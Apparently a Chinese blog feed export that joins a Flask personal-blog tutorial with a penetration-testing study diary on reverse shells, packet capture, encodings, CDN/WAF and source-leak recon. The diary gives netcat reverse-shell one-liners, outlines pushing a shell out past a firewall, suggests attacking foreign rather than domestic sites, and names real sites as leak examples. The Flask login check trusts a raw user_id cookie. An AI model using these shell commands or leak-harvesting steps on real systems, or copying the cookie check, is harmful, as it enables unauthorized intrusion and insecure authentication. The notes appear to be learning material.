<h1 id="九、前端页面渲染的一些函数操作"><a href="#九、前端页面渲染的一些函数操作" class="headerlink" title="九、前端页面渲染的一些函数操作"></a>九、前端页面渲染的一些函数操作</h1><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>capitalize</td>
<td>首字母大写</td>
</tr>
<tr>
<td>upper</td>
<td>全部大写</td>
</tr>
<tr>
<td>lower</td>
<td>全部小写</td>
</tr>
<tr>
<td>title</td>
<td>每个单词首字母大写</td>
</tr>
<tr>
<td>trim</td>
<td>去掉两边的空白</td>
</tr>
<tr>
<td>striptags</td>
<td>去掉所有的HTML标签</td>
</tr>
<tr>
<td>safe</td>
<td>即删除标签，又保留标签功能</td>
</tr>
</tbody></table>
<p>我们就可以在html页面中去使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123; name|capitalize &#125;&#125; ! <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以去便利我们对参数的使用</p>
<h1 id="十、实践操作–个人简易博客的搭建"><a href="#十、实践操作–个人简易博客的搭建" class="headerlink" title="十、实践操作–个人简易博客的搭建"></a>十、实践操作–个人简易博客的搭建</h1><h2 id="1、更加清晰分明的文件结构："><a href="#1、更加清晰分明的文件结构：" class="headerlink" title="1、更加清晰分明的文件结构："></a>1、更加清晰分明的文件结构：</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/650f1da2ad366d5775354e62a0abfe6f--661f--image-20231125193419163.png" alt="image-20231125193419163"></p>
<p>由于需要有前端显示和后端管理两个层面，所以将视图文件，模板文件，以及静态文件分为两个，并且专门创建了一个文件夹去存放，这样就能去更清晰的去文件分类。</p>
<h2 id="2、代码编写中的一些知识学习"><a href="#2、代码编写中的一些知识学习" class="headerlink" title="2、代码编写中的一些知识学习"></a>2、代码编写中的一些知识学习</h2><h3 id="1-装饰器的使用"><a href="#1-装饰器的使用" class="headerlink" title="1)装饰器的使用"></a>1)装饰器的使用</h3><p>对登录界面使用装饰器进行简化，并且解决flask中使用两次同个装饰器的报错。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="comment">#装饰器 ---登入验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">fn</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">fn</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        user_id = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user_id:</span><br><span class="line">            user = AdminUserModel.query.get(user_id)</span><br><span class="line">            request.user = user</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin/login/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure>

<h3 id="2-前端js代码的修改"><a href="#2-前端js代码的修改" class="headerlink" title="2)前端js代码的修改"></a>2)前端js代码的修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#main table tbody tr td a&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> that = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> id = that.<span class="title function_">attr</span>(<span class="string">&quot;aid&quot;</span>);  <span class="comment">//对应id</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">srcElement</span>.<span class="property">outerText</span> == <span class="string">&quot;删除&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;此操作不可逆，是否确认？&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                $.<span class="title function_">post</span>(<span class="string">&#x27;/admin/delarticle/&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: id&#125;, <span class="keyword">function</span> (<span class="params">data</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    <span class="keyword">if</span>(data.<span class="property">code</span> == <span class="number">200</span>)&#123;</span><br><span class="line">                        location.<span class="title function_">reload</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@admin.route(<span class="params"><span class="string">&#x27;/admin/delarticle/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_del_article</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        article = ArticleModel.query.get(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.delete(article)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>, e)</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除失败！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">400</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;请求方式错误！&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>进行前后端的数据交互，通过判断请求方法区决定不同的操作对于路由而言，从而去实现不同的功能，这里就是去利用了json数据与前端的交互，从而完成了页面相应和后台数据的关联。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试学习之路</title>
    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
<span id="more"></span>

<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
<p>一些参考的资料工具网站</p>
<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
<p>菱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
</blockquote>
<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
<p>Windows：nc -e cmd ip port</p>
<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
</blockquote>
<p>内网可以连接外网，外网无法去连接内网。</p>
<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
<p>②将cmd权限发出，并使用外网主机接受</p>
<p>③拿到权限，从而去完成渗透</p>
<p>例子：Pikachu靶场的攻破</p>
<p>1、信息收集，寻找目标</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/0f5af17a529d67961e925aa6be75884d--b4a3--image-20240404103555177.png" alt="image-20240404103555177"></p>
<p>这边给个小建议，别打国内的，最好国外的</p>
<p>2、判断是否有攻击利用的条件</p>
<p>（实在是现在找不到了，大部分已经都完全修复了）</p>
<p>3、最后就是远程下载nc，并将shell发出去，这样就拿到了权限。</p>
<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
<p>然后就是可以根据响应包的状态码去判断状态。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
<h1 id="第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用"><a href="#第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用" class="headerlink" title="第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用"></a>第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</h1><h2 id="1、重点总结"><a href="#1、重点总结" class="headerlink" title="1、重点总结"></a>1、重点总结</h2><p>①为什么要抓包？ -抓包应用的资产信息进行安全测试</p>
<p>②抓包的对象有哪些？ -小程序，APP，桌面应用等</p>
<p>③抓包协议区别工具？ -有部分应用不走HTTP&#x2F;S，需要用到全局协议抓包</p>
<p>④封包和抓包不同之处？  -零散整体的区别，封包能精确到每一个操作的数据包。</p>
<h2 id="2、手机APP、小程序的抓包"><a href="#2、手机APP、小程序的抓包" class="headerlink" title="2、手机APP、小程序的抓包"></a>2、手机APP、小程序的抓包</h2><p>使用bp，Charles去抓包，小程序的话不方便使用bp，使用Charles更加方便。</p>
<p>bp抓包能够精准定位到每一次数据包的发送。</p>
<h2 id="3、全局协议抓包"><a href="#3、全局协议抓包" class="headerlink" title="3、全局协议抓包"></a>3、全局协议抓包</h2><p>可以去使用科来或者wireshark去抓包，直接对全局进行抓包，并不只局限于HTTP数据包，可以更方便的用于对一些应用的抓包。</p>
<h2 id="4、封包"><a href="#4、封包" class="headerlink" title="4、封包"></a>4、封包</h2><p>这里就可以去使用一个封包监听工具，可以去监听某个进程的数据包并且进行封包，封包的话就是可以将某种行为包装成一个数据包，我们就可以重新去发送这个数据包去重复某种行为，更加精确。这就很方便于对于游戏外挂相关的制作。</p>
<h2 id="5、相关软件的介绍"><a href="#5、相关软件的介绍" class="headerlink" title="5、相关软件的介绍"></a>5、相关软件的介绍</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#参考点： Fiddder: 是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的&quot;进出&quot;Fiddler的数据（指cookie,html,j3,css等文件）。Fiddler要比其他的网络调试器要更加简单，因为它不仅仅暴露ttp通讯还提供了一个用户友好的格式。</span><br><span class="line">Charles:</span><br><span class="line">是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，char1es可以监控浏览器发送和接收的所有数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括cequest,respon3e和HTTP headers(包含cookies.与caching信息）</span><br><span class="line">TCPDump:</span><br><span class="line">是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协</span><br><span class="line">议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</span><br><span class="line">BurpSuite:</span><br><span class="line">是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suitei为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</span><br><span class="line">Wireshark:</span><br><span class="line">是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽</span><br><span class="line">可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进</span><br><span class="line">行数据报文交换。</span><br><span class="line">科来网络分析系统：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产</span><br><span class="line">品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对</span><br><span class="line">网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故</span><br><span class="line">障、安全及性能问题。</span><br><span class="line">WPE&amp;封包分析：是强大的网络封包编辑器，we可以截取网络上的信息，修改封包数据</span><br><span class="line">是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</span><br></pre></td></tr></table></figure>

<h1 id="第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值"></a>第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</h1><p>今天讲的这个就是属于很基础的一部分了，都是相关加密解密的，作为一个ctf选手这方面了解的也算挺多的，所以也就不过多去讲解了。</p>
<h2 id="1、文件加密"><a href="#1、文件加密" class="headerlink" title="1、文件加密"></a>1、文件加密</h2><p>通过各种语言自身的加密方式，对源代码进行加密，从而达到数据保护的功能。</p>
<p>dll加密、php加密、SQL加密、jar加密</p>
<h2 id="2、对编码的观察"><a href="#2、对编码的观察" class="headerlink" title="2、对编码的观察"></a>2、对编码的观察</h2><p>需要去熟悉一些加解密的相应特征，并且要求能够在碰见一些加密后的数据后能够去判断出加密方法并且对之进行解密。</p>
<h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>其实CTF中这些就是主要考点，各种像base系列，aes，md5等各种形式的加解密，这种都能够在网上去搜到相关的加解密方案的。</p>
<h1 id="第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><h2 id="1、CDN和负载均衡"><a href="#1、CDN和负载均衡" class="headerlink" title="1、CDN和负载均衡"></a>1、CDN和负载均衡</h2><p>CDN是购买结点，从而去达到工具服务器的作用，从而可以加速访问国外网站的作用，并且可以在被攻打时无法找到真正的网站服务器。</p>
<p>负载均衡时自身使用多台服务器，在访问的时候去随机访问一台服务器，从而也能起到防止渗透的作用。</p>
<h2 id="2、web安全问题"><a href="#2、web安全问题" class="headerlink" title="2、web安全问题"></a>2、web安全问题</h2><p>目录站点</p>
<p>端口站点</p>
<p>ip站点</p>
<p>服务器站点</p>
<p>站点插件</p>
<h2 id="3、番外安全问题"><a href="#3、番外安全问题" class="headerlink" title="3、番外安全问题"></a>3、番外安全问题</h2><p>域名注册商</p>
<p>服务器厂商</p>
<p>管理人员安全</p>
<h2 id="4、一些阻碍"><a href="#4、一些阻碍" class="headerlink" title="4、一些阻碍"></a>4、一些阻碍</h2><p>站库分离</p>
<p>CDN加速服务</p>
<p>负载均衡服务</p>
<p>WAF应用防火墙</p>
<p>主机防护防火墙</p>
<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CDN（Content Delivery Network）是一种分布式网络架构，旨在提供高性能、可扩展的内容传输和交付服务。CDN</span><br><span class="line">的目标是加快网站和应用程序的内容传输速度，减少延迟并提供更好的用户体验。</span><br><span class="line"></span><br><span class="line">CDN 的工作原理如下：</span><br><span class="line"></span><br><span class="line">缓存：CDN 在全球各地部署了多个边缘节点服务器，这些服务器上有大容量的缓存存储。原始内容（如网页、图像、视频等）会被缓存在这些服务器上。</span><br><span class="line">路由：当用户请求访问某个资源时，请求会被智能路由到距离用户最近的边缘节点服务器。</span><br><span class="line">加速交付：边缘节点服务器提供缓存的内容，直接向用户提供所需的资源，而不必每次都从源服务器获取。这样可以显著减少网络延迟，并提高内容的传输速度和响应时间。</span><br><span class="line">负载均衡：CDN 可以根据流量负载和网络拥塞情况自动选择最佳的边缘节点来处理请求，确保高可用性和稳定性。 CDN的优点包括：</span><br><span class="line"></span><br><span class="line">加速网站和应用程序的内容传输速度，提供更好的用户体验。 减轻源服务器的负载，提高可扩展性和稳定性。</span><br><span class="line">提供全球范围的网络覆盖，确保内容在用户附近的节点上提供。</span><br><span class="line">CDN广泛应用于网站、应用程序、媒体流等领域，许多知名的互联网公司和服务提供商都使用CDN来提供快速、高效的内容交付。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">负载均衡（LoadBalancing）是一种在计算机网络中分配工作负载的方法，通过将请求均匀地分发到多个服务器或资源上，以提高系统的性能、可靠性和可扩展性。</span><br><span class="line">负载均衡的主要目标是避免单个服务器过载，并确保每个服务器都能够有效地处理请求。它可以通过以下方式实现：</span><br><span class="line">请求分发：负载均衡器接收到来自客户端的请求，并将其分发给后端的多个服务器。这个过程可以基于不同的算法，如轮询、最少连接、权重等，以确保请求平均地分布到各个服务器上。</span><br><span class="line">健康检查：负载均衡器会周期性地对后端服务器进行健康状态检查，以确保它们正常运行。如果某个服务器出现故障或不可用，负载均衡器将自动将请求转发到其他可用的服务器上。</span><br><span class="line">扩展性：当系统负载增加时，可以向负载均衡器添加更多的服务器，以满足不断增长的请求。负载均衡器将自动将流量分发到新添加的服务器上，从而提高系统的容量和性能。</span><br><span class="line">负载均衡在许多应用场景中发挥关键作用，如网站和应用程序的高可用性、流量管理、提高系统吞吐量等。常见的负载均衡技术包括硬件负载均衡器、软件负载均衡器和云平台提供的负载均衡服务。</span><br></pre></td></tr></table></figure>

<h1 id="第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取"></a>第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</h1><p>知识点：</p>
<p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等</p>
<p>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等</p>
<p>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他</p>
<p>4、打点-Web域名-子域名&amp;反查域名&amp;旁注等</p>
<p>信息点：</p>
<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
<p>技术点：</p>
<p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p>
<h1 id="第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份"></a>第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</h1><p>知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
<p>详细点：<br>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p>
<p>源码泄漏集合：<br>composer.]son<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.m1泄露<br>DS Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p>
<p>演示案例：<br>直接获取-CMS识别-云悉指纹识别平台<br>（yunsee.cn 在线指纹识别平台）<br>习惯不好备份文件-某黑阔博客源码泄漏<br>（网站管理员将网站备份到网站目录下造成源码泄露）<br>配置不当-GIT泄漏某程序员博客源码泄漏<br>参考链接：<a href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>利用工具：<a href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
<p>当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了<br>比如某个网站存在.git文件泄露，可以：<br>利用方式：<br>github上的githack可以把整个.git备份的文件下载下来。它能解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码<br>配置不当-SVN泄漏-某国外小伙子源码泄漏<br>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。<br>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留，因此攻击者可以使用工具 dvcs-ripper 下载网站源码。<br>当可以访问到&#x2F;.svn&#x2F;entries的时候，就证明存在了。<br>比如乌云曾经爆出的某个网站：</p>
<p><a href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>利用工具 <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>工具命令 rip-svn.pl -v -u <a href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
<p>配置不当-DS Store泄漏-某开发Mac源码泄漏<br>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。通过.DS_Store可以知道这个目录里所有的文件名称。</p>
<p>当访问&#x2F;.ds_store可以访问的到，就证明存在。例如：</p>
<p><a href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
<p>工具:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>使用方式：</p>
<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
<p>PHP特性-composer.json泄漏-某直接搭建源码泄漏</p>
<p>例如：<a href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
<blockquote>
<p>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</p>
<p>解题思路：访问靶场通过控制filename来任意文件下载</p>
<p>因为WEB-INF会存储配置文件，所以构造filename&#x3D;WEB-INF&#x2F;web.xml,此文件会记录源码的结构</p>
<p>访问文件内容，并构造文件名下载</p>
<p>最后通过反编译出flag</p>
</blockquote>
<blockquote>
<p>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工<br>通过github和google hack语法搜索相关信息<br>相关利用项目：</p>
<p>cMs识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> 备份：敏感目录文件扫描 -7 kbscan-WebPathBrute<br>CVS:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
</blockquote>
<blockquote>
<p>GITHUB资源搜索：<br>in:name test #仓库标题搜索含有关键字<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字</p>
</blockquote>
<h1 id="第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙"></a>第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</h1><p>知识点：<br>1、获取网络信息-服务厂商&amp;网络架构<br>2、获取服务信息-应用协议&amp;内网资产<br>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
<p>详细点：<br>CDN服务，WAF防火墙，负载均衡，防火墙阻碍</p>
<p>演示案例：<br>1、网络信息获取-服务厂商&amp;网络架构<br>通过域名信息查询获取 IP、云服务厂商、域名出售厂商、注册者邮箱等信息（可以使用威胁情报平台）</p>
